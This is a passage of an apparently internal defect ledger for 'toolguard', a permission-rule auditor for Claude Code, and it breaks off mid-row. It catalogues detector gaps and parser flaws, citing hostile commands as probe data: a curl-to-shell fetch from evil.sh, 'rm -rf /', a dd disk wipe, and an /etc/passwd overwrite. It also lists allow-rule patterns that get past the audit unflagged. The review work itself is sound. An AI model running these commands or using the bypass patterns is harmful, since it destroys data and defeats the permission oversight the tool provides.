* **`toolguard/tools/danger.py:78` carries the same false claim pass 2 just deleted from this file.** Its `DangerFinding.remediation_kind` docstring reads *"``'remove'`` (delete the rule -- always a safe tightening)"*. Refuted by the `no_match_fallback = "allow"` case: with a `Bash(*)` blanket allow in play, applying `remove` to the flagged rule left `curl http://evil.sh | sh` resolving allow -> allow, so removal is *tightening or neutral*, not always a tightening. Out of scope here -- `danger.py` is being swept separately -- but `security_audit._danger_proposal`'s copy of the claim is now gone, so this is the surviving one.
* Neither file was edited: `docs/*` and the argparse strings are outside a comments-only pass.

### Refactoring candidates surfaced by the comment sweep

| # | function | signal | shape of the fix |
|---|---|---|---|
| SA-R1 | `security_audit.security_audit` | ~95 lines that are four consecutive `for ... ranked.append(RankedFinding(...))` blocks, each spelling out all twelve fields, three of which needed their own explanatory comment before this pass. The blocks differ only in which source-finding attribute feeds which normalised field -- and every difference between them (`impact=""` vs `af.impact`, `pattern=None` vs `cf.allow_pattern`, `takeover_active=df.takeover_active` vs `takeover.enabled`, `acknowledged` computed in exactly one of the four) is invisible until you diff them by eye. SA1 and SA4 are both defects of *asymmetry between these four blocks*, which is the signal. | Candidate: one `_ranked_from(source, ...)` per analyser -- `_rank_danger(df)`, `_rank_takeover(af, takeover)`, `_rank_clarity(cf, takeover)`, `_rank_environment(ef, takeover)` -- each a short function whose name is the block's current comment, leaving `security_audit` as four `ranked.extend(...)` lines plus the sort. The four field-mapping differences then sit side by side in four adjacent signatures instead of buried in four 20-line literals. |
| SA-R2 | `security_audit.main` | ~180 lines doing six unrelated things in sequence: build a five-option parser (~95 lines), read and decode two optional JSON side-files, load config and audit, re-audit as-if-enacted and diff, hand-assemble a nested JSON payload including a four-level comprehension over `ctx.tools -> layers -> comments`, then render. The JSON assembly alone is ~80 lines of dict literal duplicating the field lists of `RankedFinding`, `AuditContext`, `LayerContext` and `RuleComment`. Same shape as `M-R1` (`maintenance.main`) and `INS-R3` (`installer._build_parser`), and worth fixing consistently with them. | Candidate: `_build_parser()`; `_load_json_arg(parser, path, decoder)` covering both `--migrations` and `--edits`; and `_context_payload(config)` / `_findings_payload(report)` returning the JSON-safe dicts. The serialization halves arguably belong next to the dataclasses they mirror (`config_access`, this module) rather than in a CLI entry point -- `edit_proposal.py` already keeps its own `*_to_dict` beside its dataclasses, which is the precedent. |

## Code-level defects found during #07 on `tools/danger.py` (2026-08-11)

Comments-only pass -- **nothing below was fixed.** Rows are lettered `DG*`; the numeric sequence and `E`/`S`/`V`/`D`/`EL`/`IU`/`OP`/`T`/`TCV`/`RS`/`TL`/`INS`/`N`/`R`/`SA`/`M` are already claimed by concurrent per-file passes. Every row was executed live against the module's own predicates, 2026-08-11, on this branch.

The theme: **the detector tables promise more coverage than the matcher delivers**, and every gap is a silent false negative -- a dangerous allow rule that a security audit reports as clean.

| # | defect | where | note |
|---|---|---|---|
| **DG1** | **HIGHEST SEVERITY -- four of the six advertised destructive-command categories never fire in the DEFAULT/GLOB branch.** `_body_fnmatch_matches_any` appends its own `' '`/`':'` separator, so a table entry that already ends in one is unreachable, and an entry ending in `=` is unreachable in the natural pattern form. Executed: `_is_destructive('Bash', 'rm -r:*', DEFAULT)` -> `False`; `'rm -r *'` -> `False`; `'rm -r /tmp/x'` -> `False`; `'shred:*'` -> `False`; `'shred *'` -> `False`; `'dd if=*'` -> `False`; `'dd if=/dev/zero of=/dev/sda'` -> `False`; `'format *'` -> `False`. Only `rm -rf`, `rm -fr`, `mkfs` and `wipefs` fire (`'rm -rf:*'` -> `True`, `'mkfs:*'` -> `True`). The REGEX branch uses a *different*, separator-free tuple and does catch `shred`/`dd if=`, which is why the gap is invisible from a regex-only reading. | `toolguard/tools/danger.py:_DESTRUCTIVE_PREFIXES` -- entries `'rm -r '`, `'rm -r:'`, `'shred '`, `'shred:'`, `'dd if='`, `'format '` | Fix is in the strings, so it was out of scope here: drop the trailing separators (`'rm -r'`, `'shred'`, `'format'`) and either add a `'dd'` prefix or special-case `=`. `'rm -r'` as a bare entry then also catches `rm -r:*` and `rm -r *`. Add a test per category -- there is currently none that would have caught this. |
| **DG2** | **Seven of the eleven `_ARBITRARY_EXEC_PREFIXES` entries are dead**, for the same reason as DG1. `'python:'`, `'python3:'`, `'node:'`, `'ruby:'`, `'perl:'`, `'sh -c:'`, `'bash -c:'` can only match a body starting `'python: '` or `'python::'`, etc. Executed: `_body_fnmatch_matches_any('python:*', ('python:',))` -> `False`. The patterns they were meant to catch are caught anyway -- by the bare-name loop (`'python:*'` -> `True` via `_ARBITRARY_EXEC_BARE`) or by the shorter entry (`'sh -c:*'` -> `True` via `'sh -c'`) -- so this is dead weight and a false sense of coverage, not a live hole. `'python3'` is likewise redundant with the bare entry. Only `'uv run python'`, `'sh -c'` and `'bash -c'` are load-bearing. | `toolguard/tools/danger.py:_ARBITRARY_EXEC_PREFIXES` | Harmless today, but it is the same mistake as DG1 in a table where it happens not to bite, and it is what makes DG1 easy to reproduce by copying. Delete the redundant entries. |
| **DG3** | **`uv run python3` is not detected, while `uv run python` is.** Executed: `_is_arbitrary_exec('Bash', 'uv run python:*', DEFAULT)` -> `True`, but `'uv run python3:*'` -> `False` and `'uv run python3 -m unittest:*'` -> `False`. The prefix entry is `'uv run python'`, and `'uv run python3:*'` continues it with `'3'` rather than a separator. Same class: `'uvx python:*'` -> `False`. | `toolguard/tools/danger.py:_ARBITRARY_EXEC_PREFIXES` | `uv run python3` is a form Claude Code actually emits. Add it, or match `uv run python` as a token prefix with an optional version suffix. |
| **DG4** | **`_is_blanket_allow` misses two bodies that really do permit everything.** It has no NATIVE branch and its DEFAULT branch tests `== '*'` exactly. Executed: `_is_blanket_allow('Bash', '*', NATIVE)` -> `False` while `match_pattern(NATIVE, '*', 'rm -rf /')` -> `True`; `_is_blanket_allow('Bash', '**', DEFAULT)` -> `False` while `match_pattern(DEFAULT, '**', 'rm -rf /')` -> `True` (`fnmatch`'s `*` crosses everything, so `**` is a total wildcard under DEFAULT too). So `Bash([native]*)` and `Bash(**)` are complete governance bypasses that produce no `blanket-allow-outside-takeover` finding -- and, because the first loop's skip is keyed on the same predicate, they instead fall through to the content detectors and get reported (or not) as something far less severe. | `toolguard/tools/danger.py:_is_blanket_allow` | Add `PatternType.NATIVE` with the same `('*', '**')` set, and add `'**'` to the DEFAULT set. |
| **DG5** | **`sudo`- and absolute-path-prefixed allow rules escape both command detectors.** Executed: `_is_destructive('Bash', 'sudo rm -rf *', DEFAULT)` -> `False`, `'/bin/rm -rf *'` -> `False`; `_is_arbitrary_exec('Bash', 'sudo python:*', DEFAULT)` -> `False`, `'/usr/bin/python3:*'` -> `False`. Both predicates anchor on the body's first token. This is the pattern-table analogue of the `^rm\b`-defeated-by-`/bin/rm` gap noted elsewhere in this ticket. | `toolguard/tools/danger.py:_body_fnmatch_matches_any` and both callers | Lower priority than DG1-DG4 (an allow rule someone wrote as `sudo rm -rf *` is at least visible in the file), but it is the same false-negative direction. |
| **DG6** | **Two rationale strings claim coverage the detectors do not have.** `arbitrary-exec-allow`'s says "interpreter: python/node/ruby/perl/sh/bash/exec", but `exec` is deliberately excluded from the REGEX branch's token tuple, so a `[regex]` finding's rationale names a check that did not run. `destructive-cmd-allow`'s says "(rm -rf, shred, dd, mkfs, wipefs, etc.)", and per DG1 `shred` and `dd` do not fire at all in the DEFAULT/GLOB branch. Strings are code; not touched. | `toolguard/tools/danger.py:_DETECTORS` rationale templates | Both become true once DG1 is fixed, except `exec` in the regex case. Fix DG1 first, then re-read the strings. |
| **DG7** | **`_audit_tool`'s `ignored_extracted` parameter is never read**, and the takeover skip it was presumably meant to serve calls `neutralized_by_takeover`, which recomputes the set from `takeover` itself. `danger()` computes and threads it anyway. | `toolguard/tools/danger.py:danger`, `_audit_tool` | Delete the parameter and the `normalized_ignored_patterns()` call in `danger()`. |
| **DG8** | **The takeover skip in `_audit_tool` is dead in the default path.** `per_layer_rules` -> `Configuration.permission_layers` has already dropped the ignored-allow patterns from native layers before `_audit_tool` sees them, so `neutralized_by_takeover` returns `False` for everything that survives. Executed with takeover on and `ignored_allow_patterns = ['Bash(*)']`: the native layer's `lr.allow` came back as `('rm -rf:*',)` -- `Bash(*)` was already gone -- and `neutralized_by_takeover` returned `False` for every pattern in every layer. It can only fire when a caller passes a `takeover` that disagrees with the config's own, which `security_audit` does not do. | `toolguard/tools/danger.py:_audit_tool`, both loops | Not a bug -- defence in depth against a caller-supplied takeover -- but worth deciding deliberately, because a reader reasonably concludes from the two calls that this module is where the suppression happens. If it is kept, it wants a test that passes a divergent `takeover`; there is none. |
| **DG9** | **A `[regex]` allow of `exec` is caught by no detector at all.** `_is_arbitrary_exec` excludes `exec` from the REGEX branch's token tuple (deliberately, because of negative lookaheads), and the DEFAULT/GLOB branch that does check it is *unreachable for a REGEX body* -- the two branches are an `if/else` on `ptype`, not a fallthrough. Executed 2026-08-11: `_is_arbitrary_exec('Bash', 'exec .*', REGEX)` -> `False`; `_is_arbitrary_exec('Bash', '^exec\\b.*', REGEX)` -> `False`; `_is_arbitrary_exec('Bash', 'exec', DEFAULT)` -> `True`. So the exclusion is not a trade of one branch's coverage for another's -- it is total. Extends DG6, which records the *string* claiming the coverage; this row records the coverage gap itself. | `toolguard/tools/danger.py:_is_arbitrary_exec` REGEX branch | Either accept it explicitly (the lookahead false-positive may genuinely be worse than the miss) or catch `exec` in the regex branch with a token-boundary test that a lookahead cannot spoof. Whichever is chosen, DG6's rationale string should stop advertising `exec` for `[regex]` findings. |
| **DG10** | **`_is_blanket_allow`'s REGEX branch is a five-element literal list, and total-bypass regexes walk straight past it -- with the MEDIUM backstop silenced by the same character.** The branch tests membership in `('.*', '.+', '^.*$', '^.+$', '')`. Executed 2026-08-11, every one of these returns `_is_blanket_allow` -> `False` while `match_pattern(REGEX, body, 'rm -rf /')` -> `True`: `^`, `^.*`, `.*$`, `(.*)`, `.*?`, `[\s\S]*`. Worse, `^.*` and `^` also *pass* `_is_unanchored_regex`'s `body.strip().startswith("^")` test, so the MEDIUM unanchored-regex backstop does not fire either -- the anchor character that makes the pattern look disciplined is the one that silences the last remaining detector. `[glob]**/*` is the same hole in the GLOB branch (`_is_blanket_allow` -> `False`, `match_pattern` -> `True`). End-to-end confirmation via `danger()` on a one-layer config: `Bash([regex]^.*)`, `Bash([regex]^)`, `Bash(**)`, `Bash([glob]**/*)` and `Bash([native]*)` each return `[]` -- **no finding of any severity**. Extends DG4, which found the DEFAULT/NATIVE half of the same defect. | `toolguard/tools/danger.py:_is_blanket_allow`, and `_is_unanchored_regex`'s interaction with it | A literal membership list cannot be completed by adding entries -- the space of total-match regexes is unbounded. Prefer a behavioural test: does the body match a battery of known-dangerous probe commands (`rm -rf /`, `curl x | sh`, ...)? That reuses the real matcher instead of guessing at its inputs, and it closes DG4 and DG10 together. |
| **DG11** | **`test_native_blanket_allow_not_flagged_when_takeover_on` passes vacuously**, so DG8's dead guard has no test holding it in place. `test/unit/test_tools_danger.py:460`. The test asserts that `Bash(*)` produces no `blanket-allow-outside-takeover` finding when takeover is on -- but `Bash(*)` never reaches `danger()`, because `permission_layers` stripped it (DG8), so the assertion is satisfied by the pattern's absence rather than by the guard. Measured 2026-08-11 by wrapping `danger.neutralized_by_takeover` in a counter and running the full suite: **79 calls, 0 returning `True`.** Deleting the entire `neutralized_by_takeover` guard from both loops would leave this test, and every other test, green. The only two tests that pass `takeover=` (`:474`, `:493`) both pass `config.takeover_mode()`, which is exactly the non-divergent case; the third (`:505`) passes none. | `test/unit/test_tools_danger.py:460`, and the guard at `toolguard/tools/danger.py:_audit_tool` | Decide DG8 first. If the guard stays, it needs a test constructing a `TakeoverConfig` that *disagrees* with `config.takeover_mode()` -- the only input shape that can make it fire. If it goes, this test should be rewritten to assert against `per_layer_rules` output, which is where the suppression actually happens. |

### Refactoring candidates surfaced by the comment sweep

| # | function | signal | shape of the fix |
|---|---|---|---|
| DG-R1 | `danger._audit_tool` | Two full passes over `lr.allow`, each re-calling `parse_pattern`, with `_is_blanket_allow` evaluated twice per pattern for opposite purposes -- once to *exclude* and once to *include*. The coupling is invisible: DG4 shows that a gap in that one predicate silently changes which loop a pattern lands in, and the "don't double-report" comment is load-bearing rather than incidental. | Candidate: one pass that parses once and branches -- `_blanket_finding(...)` when `_is_blanket_allow` holds, else `_content_finding(...)`. The mutual exclusion then falls out of an `if/else` instead of being maintained across forty lines. |
| DG-R2 | `danger._is_arbitrary_exec` | Two tables and two separate matching loops in one function body, where the second loop (`for bare in _ARBITRARY_EXEC_BARE`) is character-for-character the same test as `_body_fnmatch_matches_any`. DG2 is a direct consequence: with two overlapping tables nobody can see which entries are live. | Candidate: one table, one call -- `_body_fnmatch_matches_any(body_lower, _ARBITRARY_EXEC_PREFIXES + _ARBITRARY_EXEC_BARE)` -- after DG2's dead entries are removed. Behaviour is identical (verified by inspection of both loops' conditions; needs a test run before it is done). |

## Code-level defects found during #07 pass 2 on `toolguard/parser/` (2026-08-11)

**Six more rows for the parser table above (P1-P11).** Found during the pass-2 comment sweep on `command_extractor.py`, `command_model.py` and `multiline.py`, and all deliberately NOT fixed there (comments-only). Numbered `P12`-`P17` to continue the parser series; the `D1`-`D6` labels used in the pass-2 brief are given in parentheses because `D1`-`D4` were already claimed by the `rule_entry.py` section above.

| # | defect | where | note |
|---|---|---|---|
| P12 (D1) | **The `$(...)` recursion guard is inert.** `_collect_cmd_substs`'s `depth > 5` cutoff bounds nothing: `depth` restarts at 0 every time the walk re-enters through `_build_compound` -> `_build_pipeline_element` -> `_collect_cmd_substs(cmd_name)`. Executed 2026-08-11: 3 nested `$( )` -> 4 commands, 8 -> 9, 20 -> 21, with the maximum `depth` argument ever observed capping at 6 regardless of nesting; all 21 leaves are emitted. Safe direction (nothing is dropped), but it buys nothing, and each level rebuilds the whole compound below it before recursing, so the work is quadratic in nesting depth. | `toolguard/parser/command_model.py:_collect_cmd_substs` | Either make the guard real (thread the depth through `_build_compound`) or delete it and the parameter. The docstring now states plainly that the cutoff is inert. |
| P13 (D2) | **`_clean_simple_cmd_text` looks dead.** Instrumented and driven over every string literal in the test tree (22,362 literals, 44,724 extractor calls through both `extract_commands` and `multiline.extract_structured`), 2026-08-11: the strip removed something **zero** times. The grammar keeps `;`/`&&`/`\|\|`/`&` out of `simple_command` (`simple_command <- command_name (proc_subst / redirection / cmd_substitution / command_arg)*`) and puts `trailing_semicolon`/`trailing_background` on `compound_command`, which is not the node this function is given. | `toolguard/parser/command_model.py:_clean_simple_cmd_text`, called from `_build_pipeline_element` and `_build_compound` | Either delete it, or keep it as a deliberate belt-and-braces and say so. Its docstring's claim that a node's `.text` "can run past the command into the operator that follows it" was **unsupported and has been removed** rather than re-justified. |
| P14 (D3) | **`gawk -f` is not flagged where `awk -f` is.** `gawk` is in `FOREIGN_EXECUTORS` but absent from `_FOREIGN_INLINE_FLAGS`, so it falls back to the default `-c`/`-e`/`-r`. Executed 2026-08-11: `_detect_foreign_inline_code('awk -f prog.awk file')` -> `True`, `_detect_foreign_inline_code('gawk -f prog.awk file')` -> `False`. `pypy`/`pypy3` have the same table gap; there it is harmless, because `-c` is in the fallback anyway (`pypy -c 'x'` -> `True`). | `toolguard/parser/command_extractor.py:_FOREIGN_INLINE_FLAGS` | **Must be resolved together with P6** (the `awk -f` inversion). Whichever way P6 goes -- drop `-f`, or keep it and add a rule for awk's bare program argument -- `awk` and `gawk` have to agree, and today they silently do not. |
| P15 (D4) | **Versioned interpreters outside the seven prefix families escape the foreign-executor test.** `_is_foreign_executor` prefix-matches only `python`, `pypy`, `node`, `nodejs`, `perl`, `ruby`, `php`; every other member of `FOREIGN_EXECUTORS` must match exactly. Executed 2026-08-11: `_is_foreign_executor('Rscript4.4')` -> `False` and `('gawk5')` -> `False`, while `('python3.13')`, `('pypy3.11')` and `('node18')` are all `True`. Same class as the existing KNOWN LIMITATION about `lua`/`deno`/`bun`, but sharper: these are executors the module already claims to know. | `toolguard/parser/command_extractor.py:_is_foreign_executor`, `FOREIGN_EXECUTORS` | Either extend the prefix tuple to cover the whole set, or drop the tuple and match a canonical name plus an optional non-alpha version suffix generically. The constant's docstring now names the seven families and the two counter-examples. |
| P16 (D5) | **A non-executor heredoc sink discards the body with no ASK floor.** `_process_heredocs` replaces the redirection with a `__HEREDOC_TO_<sink>__` sentinel and drops the body for *every* non-bash sink, but the floor in `_apply_leaf_policy` is keyed on `_is_foreign_executor(<sink>)`, so an ordinary command sink gets neither the body nor a floor. Executed 2026-08-11: `extract_structured('cat <<EOF > /etc/passwd\nroot::0:0\nEOF')` -> `[LeafCommand('cat __HEREDOC_TO_cat__ > /etc/passwd', ask_floor=False)]`. Weaker than P2 -- the redirect target survives in the leaf text, so a rule on `> /etc/passwd` still has something to match -- but it is the same class of silently-dropped payload. | `toolguard/parser/multiline.py:_process_heredocs`, `toolguard/parser/command_extractor.py:_apply_leaf_policy` | Decide whether a discarded heredoc body should floor the leaf regardless of sink. The distinction is now stated in `_process_heredocs`'s docstring with this example. |
| P17 | **`_classify_pipeline_sink` and `_extract_pipeline_sink` are the hand-rolled tokenizers the module docstring said did not exist.** Not a new behavioural defect -- P2/P-R2 already cover the behaviour -- recorded because the *rule* in `.claude/rules/bash-grammar.md` names pipe splitting explicitly, and this module does it in Python. The docstring now keeps the rule and states the deviation and its reason (sink classification must run before the grammar sees the text). | `toolguard/parser/multiline.py:_split_on_unquoted_pipe`, `_classify_pipeline_sink`, `_extract_pipeline_sink` | No fix proposed. Recorded so the deviation is a considered exception rather than an undocumented violation; P-R2's consolidation is the natural place to revisit it. |

### Rejected during this pass, with evidence

- **"`NodeKind.CASE_STMT` is unreachable, so every case branch documents dead code"** -- **FALSE.** Only the *one-line* form fails to parse, which is exactly what P7 already records. The newline-separated form parses, builds an `IRControlStructure` with `kind=CASE_STMT`, and reaches the `CASE_STMT` branch in `_structured_from_ir_element`. Executed 2026-08-11: `extract_structured('case x in\na)\nls\n;;\nesac')` -> `UndecidableSegment(reason='case statement cannot be statically decomposed')`, with the IR showing `kind=<NodeKind.CASE_STMT: 6>` and every other field at its default. `IRControlStructure`'s "a `CASE_STMT` carries only *kind*, *raw_node* and *node_text*" paragraph is therefore accurate and describes live code; it was kept.

## Code-level defects found during #07 on `tools/migration_gate.py`, `tools/environment_audit.py`, `tools/corpus.py` (2026-08-12)

Comments-only pass -- **nothing below was fixed.** Rows are lettered `GA*`; the numeric sequence and `C`/`D`/`DG`/`E`/`EL`/`INS`/`IU`/`M`/`N`/`OP`/`P`/`R`/`RS`/`S`/`SA`/`T`/`TCV`/`TL`/`V` are already claimed by concurrent per-file passes. Every row was executed live against the modules on this branch, 2026-08-12.

| # | defect | where | note |
|---|---|---|---|
| **GA1** | **The `pythonpath-shadows-hook` finding's `description` string is a false universal, and its own `remediation` string is the counter-example.** The description asserts *"Any toolguard console-script or '-m toolguard...' invocation launched with this environment imports THAT package instead of the installed distribution"*; the remediation, in the same object, says the hardened `'<venv python> -E -P -m toolguard.hook'` form "make[s] it ignore PYTHONPATH and cwd entirely". Executed 2026-08-12 against a fixture `PYTHONPATH` holding a shadow `toolguard/__init__.py`: `python -c 'import toolguard'` -> `SHADOW /tmp/.../shadow/toolguard/__init__.py`; `python -E -P -c '...'` -> `REAL /home/arnon/projects/toolguard/toolguard/__init__.py`. So a hook registered in the form this very finding recommends is a live counter-example to "Any ... '-m toolguard...' invocation". The finding is still worth firing (a shadowing `PYTHONPATH` is a hazard for every *un*hardened invocation, and console scripts are never hardened) -- only the quantifier is wrong. | `toolguard/tools/environment_audit.py` -- `description=` in the `EnvironmentFinding` literal | Strings are code; left alone per the comments-only rule. Suggested fix: replace *"Any toolguard console-script or '-m toolguard...' invocation"* with *"A toolguard console-script or an unhardened '-m toolguard...' invocation"*. The module docstring was rewritten this pass to say "a freshly-launched process" without the "any", so comment and string now differ in strength until this is fixed. |
| **GA2** | **`corpus.resolve_logs_dir` has no non-test caller, and `harvest_corpus` re-implements it inline.** Grepped the whole repo 2026-08-12 (`*.py`, `*.md`, skills, docs): the only references are `toolguard/tools/corpus.py:31` (the definition) and `test/unit/test_tools_corpus.py`. Meanwhile `harvest_corpus` repeats the identical four lines -- `resolve_project_root(project_dir)`, then `resolution.root if resolution.root is not None else (project_dir or Path("."))`, then `root / DEFAULT_LOGS_SUBDIR` -- rather than calling it, because it also needs `root` itself for `transcript_dir_for_project`. | `toolguard/tools/corpus.py:31-49` and `:88-93` | Either delete `resolve_logs_dir` and its two tests, or extract the shared `_project_root_or(project_dir)` fallback and have both call it. Today the duplicated fallback is what a reader has to diff by eye to confirm the two agree. |
| **GA3** | **`MigrationPreflight.blockers` is typed `List[str]` but every return path yields zero or one entry.** Verified by reading all four returns and confirmed live 2026-08-12: an `AMBIGUOUS` root yields exactly 1, a resolved-but-non-repo root exactly 1. Both call sites (`maintenance.py:631`, `:784`) render it as a bullet list, so the list type is not wrong -- but the plural name promises an accumulation that never happens, and a reader reasonably assumes root and working-tree problems are reported together. They are not: the root reason short-circuits before the tree is examined. | `toolguard/tools/migration_gate.py:36-60` | Decide whether the property should accumulate (report both gates' problems in one pass) or return `Optional[str]`. The docstring now says "at most one" so the current behaviour is at least recorded. |

### Rejected during this pass, with evidence

- **"`corpus.py`'s module docstring names the wrong consumers of the corpus"** -- **FALSE, the original was right.** The pre-existing text named "mining, replay-backed redundancy/broadening" as the corpus consumers, and `maintenance.run_maintenance` passes `corpus` to exactly `find_redundancy`, `propose_broadening_consolidations` and `mine_rule_candidates`, withholding it from `propose_consolidations`, `find_cross_layer_redundancies` and `find_confusing_interactions` (`toolguard/tools/maintenance.py:187-199`). The clause was nonetheless cut, as an enumeration of *other* modules' behaviour that nothing in this file will ever re-check.
- **"the merged corpus mixes two clocks, so the timestamp sort is meaningless"** -- **FALSE.** Daily-log timestamps are naive local by construction and transcript timestamps are UTC on disk, but `transcript_harvest._parse_timestamp` converts to naive local before building the `LogEntry`. Executed 2026-08-12 on a fixture with one log entry and one transcript entry written at the same instant: both came back `2026-08-12 00:04:26`, one clock. The docstring now states this positively, because it is the precondition that makes the merge sort mean anything.

### Refactoring candidate surfaced by the comment sweep

| # | function | signal | shape of the fix |
|---|---|---|---|
| GA-R1 | `corpus.resolve_logs_dir` / `corpus.harvest_corpus` | The same project-root-with-fallback expression appears twice in a 105-line module, and the shorter of the two functions exists only to wrap it -- yet nothing calls that wrapper (GA2). The duplication is invisible in review because the two copies are 40 lines apart and formatted identically by `ruff`. | Candidate: one private `_project_root_or(project_dir)` returning the resolved root or the caller's fallback; `resolve_logs_dir` becomes one line over it, and `harvest_corpus` calls it once for both `logs_dir` and `transcript_dir_for_project`. Settle GA2 (keep or delete `resolve_logs_dir`) first -- if it goes, so does half of this. |

## Code-level defects found during #07 on `toolguard/tools/annotate.py`, `toolguard/tools/edit_proposal.py` (2026-08-12)

Comments-only pass -- **nothing below was fixed.** Rows are lettered `AE*`; the numeric sequence and `C`/`D`/`DG`/`E`/`EL`/`GA`/`INS`/`IU`/`M`/`N`/`OP`/`P`/`R`/`RS`/`S`/`SA`/`T`/`TCV`/`TL`/`V` are already claimed by concurrent per-file passes. Every row was executed live against the modules on this branch, 2026-08-12.

| # | defect | where | note |
|---|---|---|---|
| **AE1** | **A pattern spelled identically in two permission lists gets the *allow* rule's generated note inserted above the *deny* (or *ask*) line as well.** `_rule_first_line_patterns` builds ONE dict across the `("allow", "deny", "ask")` loop, keyed by the rule's own physical source line with no record of which list it came from; `annotate_section_text` then looks up every line of the section against it. Executed 2026-08-12 on a fixture whose `allow` and `deny` both contain `"Bash(git *)",`: both lines came back annotated `# toolguard: note A`, where `note A` was supplied only for the allow pattern. This is exactly the overlap shape `clarity`'s `deny-shadows-allow` detector fires on (an allow and a deny that overlap -- and identical patterns overlap), so it is reachable through the normal path, not a contrived fixture. The generated text then reads as a comment on the deny rule (`"deny 'git *' shadows part of this allow (deny wins)"` sitting above the deny itself). | `toolguard/tools/annotate.py:_rule_first_line_patterns`, consumed by `annotate_section_text` | Key by `(perm_type, line)` and have `annotate_section_text` track which subsection it is inside, or have `clarity_annotations` carry the section alongside the pattern. There is no test covering a pattern present in two lists. |
| **AE2** | **`apply_edits` can enact a proposal in part, silently.** A `removed_patterns` entry that is no longer in the layer's list is a no-op, while the *same* `RuleEdit`'s `added_patterns` still append. Executed 2026-08-12: a `replace` edit removing `'gone *'` and adding `'git status:*'` against a layer holding `['Bash(git *)']` returned `['Bash(git *)', 'Bash(git status:*)']` -- the broad rule survives AND the narrow one is added, which for a narrowing proposal is the unsafe direction. Nothing in the returned `Configuration` records that half the edit missed, and `security_audit --edits` then reports its introduced/resolved delta against that half-enacted state as though it were the proposal. | `toolguard/tools/edit_proposal.py:apply_edits` and `toolguard/tools/config_access.py:with_layer_rules_replaced` | The primitive would have to report what it actually removed for a caller to detect this -- e.g. return `(config, removed_count)` or raise on an unmatched removal behind a flag. Recorded, not proposed: the right answer depends on whether a stale proposal should be a hard error at the `--edits` boundary. |
| **AE3** | **A `RuleEdit` whose `provenance` differs from its layer's in ANY single field matches nothing and is skipped with no signal.** `with_layer_rules_replaced` tests `layer.provenance != provenance`, i.e. whole-dataclass equality over all five fields. Executed 2026-08-12 against a one-layer config: the exact provenance removed the pattern (`[]`); the same provenance with only `specificity` changed `0 -> 1` left `['Bash(git *)']`; only `level` changed `'project' -> 'user'` left it; and an equivalent-but-unnormalized `path` (`/tmp/x/.claude/../.claude/toolguard_hook.toml`) left it. This matters because `edit_proposal_from_dict` reconstructs `Provenance` verbatim from JSON: a hand-written or hand-edited `--edits` file with a plausible-looking but non-identical provenance produces an audit of a config nobody changed. | `toolguard/tools/edit_proposal.py:_provenance_from_dict` -> `apply_edits` -> `config_access.with_layer_rules_replaced` | At minimum, normalize `path` on both sides. Better: have `apply_edits` (or the `--edits` CLI path) report edits that matched no layer, so a stale or mistyped provenance is loud. `RuleEdit.provenance`'s docstring now states the exact-equality requirement. |
| **AE4** | **`annotate._annotation_text`'s final `return finding.explanation` would emit a multi-sentence explanation as a single `# toolguard:` comment.** Unreachable today -- `clarity` emits exactly the four kinds the if-chain handles -- and harmless today even if reached, because every `_explain*` helper returns a newline-free string. Recorded only because the two properties that make it safe live in another module: a fifth `kind`, or any explanation containing a newline, turns the generated comment into a bare continuation line inside a TOML array, which is a parse error rather than a cosmetic defect. Strings are code; not touched. | `toolguard/tools/annotate.py:_annotation_text`, `toolguard/tools/clarity.py:_explain*` | Lowest priority of these four. If it is ever worth guarding, collapse whitespace in `annotate_section_text` when emitting a note, which is local and covers every kind at once. |

### Rejected during this pass, with evidence

- **"Structured (`{ match = ..., additionalContext = ... }`) entries are never annotated"** -- **FALSE, and the false result was my own probe's fault.** A first probe built its fixture with `pattern = "Bash(git *)"`, which is not the entry key -- `rule_entry.PATTERN_KEY` is `"match"` -- so `rule_sort._rule_pattern_of_value` took its malformed-input branch and keyed the line by `SyntheticPattern(repr(value))`, which can never equal `Tool(body)`. Re-run 2026-08-12 with the real key: `_rule_first_line_patterns` returned `{'    { match = "Bash(git *)", additionalContext = "hi" },': 'Bash(git *)'}` and `annotate_section_text` inserted the notes above it correctly. Nothing was written into the file on the strength of the first probe.
- **"`annotate_section_text` only ever inserts"** -- correctly flagged in the brief, but the file **already** said the right thing (*"every existing `# toolguard:` line is dropped, then the current annotations are re-inserted"*). Only the narrative around it was cut; no correction was needed.
- **"`_finding_key`'s cross-layer collision under-reports the `introduced`/`resolved` delta"** -- true elsewhere, but `edit_proposal.py` makes **no** claim about delta completeness, so there was nothing to correct. The module docstring's one adjacent claim (that the audit re-runs over the whole resulting config) is accurate -- `security_audit.py:717-719` calls `apply_edits` then `security_audit(config)` on the full config -- and was cut anyway as an assertion about another module.
- **"`rule_apply.render_change_report` raises on an unknown format" / "the file claims ASCII output"** -- neither module mentions `rule_apply` or output encoding. Not applicable.

### Refactoring candidates surfaced by the comment sweep

**None.** Both modules are small, and the comments do not cluster: `annotate.py` is four functions of 8-15 lines each with one docstring apiece, and `edit_proposal.py`'s six serialization helpers are one-liners over flat dicts. AE1's fix is a keying change, not an extraction.

## Code-level defects found during #07 on `toolguard/tools/replay.py`, `toolguard/tools/hierarchy.py` (2026-08-12)

Comments-only pass -- **nothing below was fixed.** Rows are lettered `HR*`; the numeric sequence and `AE`/`C`/`D`/`DG`/`E`/`EL`/`GA`/`INS`/`IU`/`M`/`N`/`OP`/`P`/`R`/`RS`/`S`/`SA`/`T`/`TCV`/`TL`/`V` are already claimed by concurrent per-file passes. Every row was executed live against the modules on this branch, 2026-08-12.

| # | defect | where | note |
|---|---|---|---|
| **HR1** | **`find_cross_layer_redundancies` reports rules whose removal FLIPS the verdict, not rules whose removal is a no-op.** It indexes allow bodies only and asks `_nearest_broader_cover` for the nearest layer with a higher `specificity` holding the same normalised body -- it never looks at what any layer in between, or the covering layer itself, has in `deny`/`ask`. Executed 2026-08-12, two shapes, both flagged as redundant and both flipping: (a) project `allow git push:*`, intermediate layer `deny git push:*`, user `allow git push:*` -- `find_cross_layer_redundancies` returns the project rule as covered by the user rule; `decide` on `git push` gives `allow` before dropping it and `deny` after. (b) project `allow git push:*` with the covering user layer holding BOTH `allow` and `deny` for `git push:*` -- same finding, same `allow` -> `deny` flip. This is the same class of over-claim as the `maintenance.py` "replay-verified" wording that was corrected in that file: the finding carries no verification at all, and the shape in (a) -- a directory-level deny between a project allow and a user allow -- is an ordinary hierarchy, not a contrived one. | `toolguard/tools/hierarchy.py:find_cross_layer_redundancies`, `_nearest_broader_cover` | Two candidate fixes. Cheap: after building a finding, `replay` the corpus over (config) vs (config-without-the-specific-copy) and drop non-neutral findings -- but the function takes no corpus today, so this changes its signature and its call site in `maintenance.py`. Correct-but-static: reject a finding when any layer with a specificity strictly between the 